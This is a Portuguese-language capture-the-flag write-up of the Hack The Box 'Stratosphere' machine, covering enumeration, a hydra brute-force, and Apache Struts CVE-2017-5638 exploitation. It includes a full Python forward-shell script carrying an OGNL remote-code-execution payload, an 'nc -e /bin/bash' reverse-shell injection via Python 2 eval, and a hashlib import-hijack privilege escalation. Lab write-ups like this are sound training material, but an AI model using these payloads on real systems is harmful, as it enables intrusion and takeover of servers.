---
title: "Hack The Box - Stratosphere"
tags: [Linux,Medium,Gobuster,Brute Force,Forward-Shell,BurpSuite,Web]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/129>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta (Não vou rodar essa flag pq teve uma saída bem bizarra)

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 3 portas abertas no servidor

> Porta 22 - Servidor SSH

> Portas 80 e 8080 - Servidor Web

## Enumeração da Porta 80

Por se tratar de um servidor web, a primeira coisa que fazemos é acessar ele pelo navegador

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web.png)

Único link que aparece no site para clicarmos é esse `Getting Started` e ele da esse erro

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web1.png)

Bom, como não temos muito mais oq enumerar da cara aqui, vamos rodar o gobuster, pq geralmente sites web tem diretórios/arquivos dentro dele

## Gobuster

`gobuster dir -u http://10.10.10.64 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_gobuster.png)

Explicação parâmetros Gobuster

> dir -u -> modo discover

> -w -> wordlist utilizada

> -t 50 -> threads, pra ir mais rápido

Bom, depois de finalizado encontramos dois diretórios interessantes, o `Monitoring` e o `manager`, vamos ver do que cada um se trata então

### /manager

Acessando o diretório, temos um campo de login e senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web3.png)

Quando cancelamos a requisição, somos redirecionados para a página de erro do apache tomcat

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web4.png)

Bom, sabemos que tomcat é vulnerável, desde que tenhamos um login e senha válido, vamos tentar fazer um bruteforce ai pra ver se conseguimos algo, para isso utilizamos o hydra

#### Usando hydra

A sintaxe dele é esta, utilizamos uma lista de usuários padrão do apache tomcat

`hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web5.png)

Não obtivemos sucesso, mas pelo menos utilizamos mais um ferramenta, e treinamos como se fazer brute force com ela, vamos prosseguir

### /Monitoring

Acessando a página web, temos que ele redireciona para esse endereço

`http://10.10.10.64/Monitoring/example/Welcome.action`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web2.png)

Interessate todo esse redirect que ele fez, e ainda por nos direcionar a uma página `.action` podemos ver as outras duas páginas também são `.action`

> http://10.10.10.64/Monitoring/example/Login_input.action

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web6.png)

> http://10.10.10.64/Monitoring/example/Register.action

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web7.png)

Bom, vamos dar uma pequena pesquisada, pq esse .action não é normal

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web8.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web9.png)

Opa, está relacionado a `Struts`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web10.png)

Struts está relacionado a servidor Apache. Uma explicação melhor do que se trata e como ele funciona, está aqui (https://netbeans.org/kb/docs/web/quickstart-webapps-struts.html)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web11.png)

Bom, pesquisando por vulnerabilidades do Struts, através do serachsploit, encontramos uma pancada. Mas obviamente, devemos saber a versão dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web12.png)

## Enumerando Apache Struts

Uma vez descoberto possivelmente onde vamos entrar nesse servidor, vamos começar a sua enumeração. O primeiro passo sempre e tentar descobrir se a versão da aplicação que está sendo rodada na máquina é vulnerável a qualquer tipo de ataque conhecido

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web14.png)

> https://blog.qualys.com/securitylabs/2017/03/14/apache-struts-cve-2017-5638-vulnerability-and-the-qualys-solution

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web13.png)

Lendo o blog, descobrimos como fazer isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web15.png)

Temos que adicionar um campo na requisição HTTP, e o servidor vai responder com a o que está em pareteses

`Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Qualys-Struts',3195*5088)}.multipart/form-data`

Bom, vamos lá então.... Mandamos a requisição do `/Monitoring` para o BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web16.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web17.png)

Mandamos para o Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web18.png)

Adicionamos o `Content-Type` e enviamos a requisição (Seguimos todos os Redirects...)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web19.png)

Agora comprovando...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web20.png)

Podemos escrever no Header da Response

# Explorando Apache Struts

Bom, agora sabendo que ele é vulnerável, vamos começar a pesquisar por vulnerabilidades para se conseguir RCE nessa máquina

## Procurando por Exploits

Damos uma buscada simples por exploits no `cvedetails` (https://www.cvedetails.com/vulnerability-list.php?vendor_id=45&product_id=6117&version_id=&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&month=0&cweid=0&order=3&trc=70&sha=5369e34293062ebe460c99e6878e0792ac23944c)

Encontramos alguns com nota 10, ou seja, possivelmente vamos conseguir RCE na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web21.png)

Bom, então vamos começar a verificar um a um pra ver o que temos de bom

## CVE-2017-5638

Conseguimos RCE com esse CVE, ele explora uma das vulnerabilidades do Struts

> https://blog.qualys.com/technology/2017/03/09/qualys-waf-2-0-protects-against-critical-apache-struts2-vulnerability-cve-2017-5638

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web22.png)

Ai neste blog está explicando direitinho como fazemos pra explorar ele

Verificamos que ele tem uma entrada no exploit-db, já com o exploit (https://www.exploit-db.com/exploits/41570)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web23.png)

Copiamos para a máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web24.png)

Executamos e vemos que temos RCE!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web25.png)

## Pegando Shell

Bom, o de sempre é conseguir pegar um shell, pra ai sim podermos enumerar a máquina inteira e conseguir pontos para escalação de privilégio, mas o que percebi é que deve ter algum tipo de firewall bloqueando qualquer coisa que tenha NC ou WGET...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web26.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web27.png)

A requisição simplesmente não vai... fica travada, por isso acho que seja firewall

A opção que temos aqui é a utilização de um `Forward Shell`, um seja que sirva para burlar esse firewall.. na real ele não vai burlar mesmo, ele vai jogar a saida dos comandos para um arquivo, e eu vou ler esse arquivo, então vai ser sempre localmente, não vai precisar sair da máquina. Ele é muito útil para essas situações. Poderíamos 

## Forward Shell

Ele foi muito bem explicado no vídeo `Sokar Vulnhub` do `Ippsec` eu ainda tenho que tomar vergonha na cara e ver esse vídeo, mas o script está aqui. Logicamente não seria obrigatório utilizar ele, poderíamos fazer toda a enumeração manualmente, mas assim, é bacana ter esse tipo de ferramenta

forward-shell.py
```
#!/usr/bin/python3
# -*- cofing: utf-8 -*-
# O que ele faz aqui ele joga a saida do comando para um arquivo, e depois le o arquivo, na bucha nada sai da maquina, isso burla o firewall
import base64
import random
import requests
import threading
import time

class WebShell(object):
	# Inicializando Class + Setup Shell
	def __init__(self, interval=1.3, proxies='http://127.0.0.1:8080'):
		self.url = r"http://10.10.10.64/Monitoring/example/Welcome.action"
		self.proxies = {'http' : proxies}
		session = random.randrange(10000,99999)
		print(f"[*] Session ID: {session}")
		self.stdin = f'/dev/shm/input.{session}'
		self.stdout = f'/dev/shm/output.{session}'
		self.interval = interval

		# Setando um shell
		print("[*] Setando um fifo shell no alvo")
		MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
		self.RunRawCmd(MakeNamedPipes, timeout=0.1)

		# Setando uma thread
		print("[*] Setando uma thread")
		self.interval = interval
		thread = threading.Thread(target=self.ReadThread, args=())
		thread.daemon = True
		thread.start()

	# Lendo a $session, dando na tela o texto e limpando a session, isso sempre vai ler o stoudt
	def ReadThread(self):
		GetOutput = f"/bin/cat {self.stdout}"
		while True:
			result = self.RunRawCmd(GetOutput) # proxy=None
			if result:
				print(result)
				ClearOutput = f'echo -n "" > {self.stdout}'
				self.RunRawCmd(ClearOutput)
			time.sleep(self.interval)

	# Executar comandos
	def RunRawCmd(self, cmd, timeout=50, proxy="http://127.0.0.1:8080"):
		#print(f"Vai rodar o comando: {cmd}")
		payload = "%{(#_='multipart/form-data')."
		payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
		payload += "(#_memberAccess?"
		payload += "(#_memberAccess=#dm):"
		payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
		payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
		payload += "(#ognlUtil.getExcludedPackageNames().clear())."
		payload += "(#ognlUtil.getExcludedClasses().clear())."
		payload += "(#context.setMemberAccess(#dm))))."
		payload += "(#cmd='%s')." % cmd
		payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
		payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
		payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
		payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
		payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
		payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
		payload += "(#ros.flush())}"

		if proxy:
			proxies = self.proxies
		else:
			proxies = {}


		headers = {'User-Agent': 'QualquerCoisa', 'Content-Type': payload}
		try:
			r = requests.get(self.url, headers=headers, proxies=proxies, timeout=timeout)
			return r.text
		except:
			pass

	# Envindo b64'd comando para o RunRawCommand
	def WriteCmd(self, cmd):
		b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
		stage_cmd = f"echo {b64cmd} | base64 -d > {self.stdin}"
		self.RunRawCmd(stage_cmd)
		time.sleep(self.interval * 1.1)

	def UpgradeShell(self):
		# Melhorando o shell
		UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
		self.WriteCmd(UpgradeShell)

prompt = "stratos> "
S = WebShell()
while True:
	cmd = input(prompt)
	if cmd == "upgrade":
		prompt = ""
		S.UpgradeShell()
	else:
		S.WriteCmd(cmd)
```

Devemos deixar o BurpSuite ligado, com o `Intercept is Off` para ele funcionar corretamente

E então executamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_web28.png)

### Enumeração

Agora iniciamos a enumeração dessa máquina e de cara encontramos algo muuito interessante, credeciais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_enum.png)

```
[users]
user=admin
pass=admin
```

Possivelmente para mysql, então nos conectamos no mysql pra ver se encontramos outras credenciais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_enum1.png)

E... Encontramos credenciais!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_enum2.png)

`Richard F. Smith | 9tc*rhKuG5TyXvUJOrE^5CK7k | richard`

E verificamos que esse Richard é um usuário da máquina também

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_enum3.png)

## Login como Richard

Bom, agora sabendo que temos um login e senha válido, bem como a port 22 (SSH) aberta no servidor, vamos tentar uma conexão SSH

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_enum5.png)

Conseguimos!

# Escalação de Privilégio (Richard -> Root)

Bom, agora vamos iniciar nossa escalação de privilégio, vou fazer de duas maneiras, uma que o Ippsec fez e o outro modo que o 0xdf fez, as duas são bem interessantes de se entender, vou procurar ser o mais explicativo possível

Primeiro verificamos que podemos executar um script como root, a partir do `sudo -l`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_priv.png)

## 1 º Modo - Path Python Hijacking

A primeira maneira de se escalar vamos abusar do import do Python, como assim abusar do import?

A ideia é a mesma de quando podemos alterar o path das nossa variáveis de ambiente, onde o sistema vai buscar os binários para executar, o python faz a mesma coisa, ele procura em algum lugar pra importar as funções que são chamadas no script, podemos ver isso com o comando

`python -c 'import sys; print(sys.path)';`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_priv1.png)

Ou seja, o primeiro local que ele procura para executar é a pasta que ele se encontra!

Então agora vamos ver no script, se ele faz alguma chamada para algum modulo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_priv3.png)

Sim! Importa o `hashlib`, então se colocarmos algum arquivo chamado `hashlib.py` no nosso home, na pasta onde o script está ele vai executar ele primeiro, eita, então se executamos como root, ele vai executar como root o `hashlib.py`, sim isso mesmo!

Então fazemos nosso "hashlib.py" com um bash

hashlib.py
```
import os

os.system("/bin/bash")
```

E executamos o script como root (sudo) e viramos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_priv2.png)

## 2 º Modo - Através do Input (ou eval())

Aqui vamos explorar de outro modo, através do `input`

Verificamos no sudo -l que temos um coringa no python, o que indica que temos mais que uma versão do python na máquina, verificamos isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_b.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_b1.png)

O que verificamos? Não é comum o python mapear diretamente pro python3, ele geralmente joga pro python2. Algumas funções são diferentes no Python2 e no Python3, uma delas é o `input`. O script test.py está mapeado pra ser executado por default pelo Python3. No Python3 a função `input` é pra isso mesmo, pra pegar o input do usuário. Mas no Python2 ele funciona diferente, ela é equivalente a `eval(raw_input(prompt))`. Então podemos passar algo para a função e ela ser executada pelo eval, e o eval por sua vez pode executar comandos de shell

Esse blog explica melhor esse rolo que eu fiz ai em cima (https://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html), fica como referencia, mas vamos tentar reproduzir aqui

Vamos tentar passar um parâmetro para esse input, vamos tentar fazer ele dar um touch no /home/exploit

`__import__("os").system("touch /home/richard/exploit/stratosphere")`

E veirificamos que o arquivo foi criado, e como root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_b2.png)

Então pegamos um shell

`__import__("os").system("nc -e /bin/bash 127.0.0.1 9999")`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_b3.png)

Bom, já deu, exploramos bem tudo isso!

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-stratosphere/S_user.png)